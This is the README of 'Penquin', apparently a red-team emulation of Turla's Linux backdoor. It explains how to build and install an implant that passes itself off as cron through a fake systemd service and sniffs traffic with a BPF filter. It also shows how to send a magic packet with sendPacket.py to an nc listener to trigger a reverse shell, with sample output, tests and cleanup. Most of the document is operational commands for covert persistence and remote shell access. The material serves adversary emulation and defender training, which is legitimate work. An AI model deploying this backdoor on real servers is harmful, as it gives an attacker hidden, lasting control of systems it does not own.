# Penquin
Penquin is a backdoor for re-activating access to servers over long term engagements. Penquin installs a BPF filter, mimicing cron, to listen on a servers network interface. When turla sends an activation packet to the targeted host, a reverse shell is activated. 

Penquin is broken into the following components:
| Component | Description |
| --- | --- |
| sniff.c | Executes cron as a child process while deploying a BPF network sniffer that waits for a matching packet. Once the matching packet it recieved, a reverse shell is executed. The reverse shell was based on the common usage of this method captured in the [ExaTrack Report](https://exatrack.com/public/Tricephalic_Hellkeeper.pdf) |
| cron.h | A header file containing the byte array of the compiled sniff.c program (generated using the build script ([build_Penquin.sh](./build_Penquin.sh)) |
| main.c | Writes Penquin to disk, then installs and executes Penquin masquerading as cron |
| sendPacket.py | Sends an activation packet to a targeted host |
| crypt.h | Obfuscates strings (max 64 char) at compile time - Deobfuscates strings at runtime | 

<br/>


## Usage Example - Manual Execution
---
This assumes you are running as root on the target Ubuntu system.

1. From the  `/root/` folder, execute `penquin`. Total time 8 seconds to execute. There is no expected terminal output. 
    ```
    ./hsperfdata
    ```
1. Remove `penquin` from disk.
    ```
    rm hsperfdata
    ```

<br/>
<br/>

### Execution checks
---
1. Verify cron is running cron. `/usr/bin/cron -f` is our evil cron, `usr/sbin/cron -f` is real cron. 
    ```
    systemctl status cron
    ```
    Results should look like...
    ```
    ● cron.service - Regular background program processing daemonb
     Loaded: loaded (/etc/systemd/system/cron.service; disabled; vendor preset: enabled)
     Active: active (running) since Wed 2022-12-28 19:57:19 UTC; 30s ago
       Docs: man:cron(8)
   Main PID: 88494 (cron)
      Tasks: 4 (limit: 9530)
     Memory: 980.0K
     CGroup: /system.slice/cron.service
             ├─88494 /usr/bin/cron -f
             ├─88495 /usr/bin/cron -f
             ├─88496 sh -c /usr/sbin/cron -f
             └─88497 /usr/sbin/cron -f
    
    ```

    >
    >### Context for Implementation of cron
    >Based on the [Leonardo Report](https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf) and [Presentation](https://www.youtube.com/watch?v=JXsjRUxx47E&t=647s), Penquin deploys a legitimate version of the Linux utility `cron` and executes `cron` as a child process of Penquin. However, reporting was unclear on the series of events between Penquin’s initial execution and the execution of `cron`. To address this gap, Red Team developers hypothesized the below process tree was the objective of deploying `cron`, [Masquerading](https://attack.mitre.org/techniques/T1036/) Penquin as real cron. In order to provide this process tree, we leveraged the [Create or Modify System Process: Systemd Service](https://attack.mitre.org/techniques/T1543/002/) technique to execute Penquin. 
        
    **Target Process Tree**
    
        - init
        -- systemd
        --- cron (our evil cron; listens for activation packets)
        ---- cron (real Linux cron utility; does cron things)

    <br/>

1. Verify the socket is actively listening. 
    ```
    ss -l -a -n -p | grep "cron"
    ```
    `p_raw` is where our evil cron is listening.

    Results should look like...
    ```zsh
    p_raw   UNCONN  0   0   *:eth0  *   users:(("cron",pid=1071197,fd=3))            
    ```
<br/>
<br/>

## Activation Packet (AKA Magic Packet)
---
#### On Attacker Host

These steps assume sniff.c(compiled) is already running on the victim host. On the attacker host, start a listener and execute this script. This script sends a crafted packet to the victim host activating a reverse shell connecting to the listener. 

1. Install all [requirements](./requirements.txt)
    ```
    pip install -r requirements.txt
    ```
1. In a terminal window, set up a `netcat` listener. Using `8081` ensures we are not conflicting with other listeners in this scenario. 
    ```
    nc -lvvp 8081
    ```
1. Open a second terminal window and navigate to the `/turla/Resources/Penquin` directory. Execute the `sendPacket.py` script. Update IPs/ports as needed - Penquin currently sniffs on all ports on the victim machine for the magic packet. Port `8080` is used based on [Lab52's report](https://lab52.io/blog/looking-for-penquins-in-the-wild/).
    ```
    sudo -E python3 sendPacket.py --handler_ip 10.0.2.8 --handler_port 8081 --target_ip 10.0.1.6 --target_port 8080 --payload_type base64
    ```
1. You will see the packet info in the terminal screen + the hexdump of the packet. The terminal output `Sent 1 packets` confirms the packet was successfully sent. 
1. Check the terminal window with the netcat listener, the reverse shell should be running inside the victim's `/root` directory. 

>### Magic Packet Context
>- Make sure that the ipaddress inside the python file is correct. The default configuration will trigger the reverse shell to localhost (127.0.0.1) on port 6792. This can be changed by specifying a custom hander IP address using `--handler_ip <IP Address>` and the port can be changed using `--handler_port <port>`. The target where the penguin implant resides can be set using `--target_ip <IP Address>` and the port can be adjusted using `--target_port <port>`.
>- The penguin implant currently only supports plain text base64 encoded payloads. This can be set in the packet generator using `--payload_type base64` alternatively, an AES encrypted payload can be sent using `--payload_type aes`.

<br/>
<br/>

## Build Instructions
---

### Requirements
The following must be installed on the Ubuntu dev host:
- `build-essential`
- `libpcap-dev`
- Ensure the `GCC` version is compatible between build host & victim host 

Summary of Build Process
1. Compile the sniffer into a binary
1. Convert the sniffer binary into a header file using `xxd`
1. Add `extern` to variables contained in the header file
1. compile `penquin` program with the header file containing the sniffer binary

<br/>


1. Navigate to the `/Resources/Penquin/` folder
    ```bash
    cd /Resources/Penquin/
    ```
1. Verify the `build_Penquin.sh` exists in the folder with executable permissions.
    ```bash
    ls -lart build_Penquin.sh
    ```
1. Execute the build script ([build_Penquin.sh](./build_Penquin.sh)).
    ```zsh
    ./build_Penquin.sh
    ```
    Results should look like the following:
    ```bash
    Compiling the sniffer...
    ✔ ./sniff.c exists
    ✔ Success: gcc -s -O3 -o cron sniff.c -lpcap
    ✔ ./cron exists
    Success! Sniffer compiled as cron.

    Converting sniffer to a header file...
    ✔ Success: 
    ✔ ./cron.h exists
    Inserting external variable into header file...
    ✔ Success: 
    ✔ Success: 
    Success! Header file modified.

    Compiling penquin & the embeding the header file...
    ✔ ./main.c exists
    ✔ Success: gcc -s -w -O3 -o hsperfdata main.c
    ✔ ./hsperfdata exists
    Zipping Penquin...
    adding: hsperfdata (deflated 76%)
    ✔ Success: zip hsperfdata.zip hsperfdata
    ✔ Success: mv ./hsperfdata.zip ./hsperfdata
    ✔ ./hsperfdata exists
    Success! Penquin compiled as hsperfdata & zipped
    NOTE: Without the extension of .zip

    Cleaning up build artifacts...
    ✔ Success: rm ./cron
    ✔ ./cron exists
    ✔ Success: rm ./cron.h
    ✔ ./cron.h exists
    Clean up complete
    PATH to binary: /path/to/Penquin/binary/hsperfdata
    ```
1. Verify the Penquin binary is present. The binary location is provided in the last line of the terminal output. 


Context on `cron` utility usage: Based on [reference article](http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html).
- `-s` = `gcc`'s version of the `strip` command
- `-O3`= optimizes the code 
- `-o` = names the output file (default is a.out)
- `-lpcap` = is used to statically link the lpcap library - this is consistent with CTI reporting in the [Leonardo Report](https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf). 

Binary is now ready for deployment in operations. Continue to next section if only testing execution locally.

<br/>
<br/>

## Testing
---
This assumes the build script ([build_Penquin.sh](./build_Penquin.sh)) has been executed with the resulting binaries in the folder. 
Summary of testing process
- Moves `penquin` to `/root/` folder
- Executes `penquin` 
- Verifies`penquin` was executed as expected
- Requires `sudo` privileges to execute

1. Navigate to the `/Resources/Penquin/` folder
    ```bash
    cd /Resources/Penquin/
    ```
1. Verify the `execution_penquin_test.sh` exists in the folder with executable permissions.
    ```bash
    ls -lart execution_penquin_test.sh
    ```
1. Run the following command on the victim host
    ```zsh
    sudo ./execution_penquin_test.sh
    ```

    Results should look like the following:
    ```bash
    =========================================================
    Beginning Tests
    =========================================================
    Setting up installation....

    ✔ Success: cp ./hsperfdata /root/hsperfdata
    Archive:  hsperfdata
    inflating: hsperfdata              
    ✔ Success: ./execution_penquin_test.sh
    Test 1 Success! /root/hsperfdata exists & has executable permissions
    Executing...(for 8 seconds)...
    ✔ Success: 
    =========================================================
    [Test 1]: Installation Check
    =========================================================
    Testing dropped files....
    /usr/bin/cron exists & has executable permissions
    /etc/systemd/system/cron.service exists but does not have executable permissions
    =========================================================
    [Test 2]: Execution Checks
    =========================================================
    Checking cron service status...
    Test 2 Success! cron is running
    checking for running cron process from usr/bin rather than usr/sbin...
    Test 3 Success! Cron is running under PGID: 1071197
    checking raw socket connection...
    Test 4 Success! A raw socket is running with cron active
    =========================================================
    [All Tests Complete]
    =========================================================
    ```

<br/>
<br/>


## Cleanup Instructions

---
Summary of clean up process:
- Removes all files dropped to disk
- Kills all processes associated with our cron service in `/usr/bin/`
- Reloads the cron service back to it's original state operating from `/usr/sbin`
- Requires `sudo` privileges 

1. Navigate to the `/Resources/cleanup/Penquin/` folder
    ```bash
    cd /Resources/cleanup/Penquin/
    ```
1. Verify the cleanup_penquin.sh exists in the folder with executable permissions.
    ```bash
    ls -lart cleanup_penquin.sh
    ```
1. With `sudo`, Execute the following command in the `/Resources/cleanup/Penquin/` folder.
    ```bash
    sudo ./clean_penquin.sh
    ```
Expected output
    ```bash
    Destroying all the Penquins...

    Removing files on disk...
    ✔ /root/hsperfdata exists
    ✔ Success: rm /root/hsperfdata
    ✔ /root/hsperfdata does not exist
    ✔ /usr/bin/cron exists
    ✔ Success: rm /usr/bin/cron
    ✔ /usr/bin/cron does not exist
    ✔ /etc/systemd/system/cron.service exists
    ✔ Success: rm /etc/systemd/system/cron.service
    ✔ /etc/systemd/system/cron.service does not exist

    Killing the cron processes...
    Cron is running under PGID: 698039 
    ✔ Success: kill -- -698039
    Test  Success! Verified all proesses associated with the group id 

    Resetting the cron service (takes 3 seconds)...
    ✔ Success: 
    cron is NOT running
    ✔ Success: 
    ✔ Success: systemctl start cron
    cron is running
    *********************     Host Reset Complete    *********************
    ```

<br/>
<br/>

## Misc
---
### CTI Evidence
- [Leonardo Report](https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf)
- Other projects (cd00r.c & LOKI2) referenced in the [Kaspersky - Penquins Moonlit Maze Report](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180251/Penquins_Moonlit_Maze_PDF_eng.pdf)
- [Leonardo Presentation](https://www.youtube.com/watch?v=JXsjRUxx47E&t=647s)
- [cd00r.c](https://packetstormsecurity.com/files/22121/cd00r.c.html)
- [LOKI2 - Phrack Volume 7, Issue 51](http://phrack.org/issues/51/6.html#article) and github code from [JeremyNGalloway](https://github.com/JeremyNGalloway/LOKI2)
- Activation Packet [Lab52](https://lab52.io/blog/looking-for-penquins-in-the-wild/)

### References
- Filter uses reference code from [DevDungeon](https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+“Penquin_x64”.pdf)
- Stuart McMurray - [Offensive pcap presentation](https://www.youtube.com/watch?v=Sig1QTev6MY)
- C string obfuscation crypt.h - [BroOfBros](https://github.com/BroOfBros/C-Cpp-Macro-Encryption/blob/master/Crypt.h)

<br/>
<br/>

## Troubleshooting
---
1. Identify all processes associated with our evilcron, note the process group number in the list, it should be the same for most of them. 
    ```
    ps -efj | grep cron
    ```
1. Kill the process group for cron. Copy/Paste the process group id (3rd column of numbers from left to right) in place of the `PGID` placeholder in the below command. After executing, the entire process tree should be killed. Verify with `ps -efj | grep cron` command or `ps -Hlwwfe`. :ax: (i.e. `kill -- -252557`)
    ```
    kill -- -PGID
    ```
1. Use the below command to check the status of cron. If the status blurb is the same as below, penquin is NOT running. 
    ```
    systemctl status cron
    ```
    The status message should resemble the below blurb:
    ```
    ● cron.service - Regular background program processing daemon
        Loaded: loaded (/lib/systemd/system/cron.service; disabled; vendor preset: enabled)
        Active: active (running) since Wed 2022-12-07 20:34:13 UTC; 4s ago
        Docs: man:cron(8)
    Main PID: 39759 (cron)
        Tasks: 1 (limit: 9530)
        Memory: 2.3M
        CGroup: /system.slice/cron.service
                └─39759 /usr/sbin/cron -f
    ```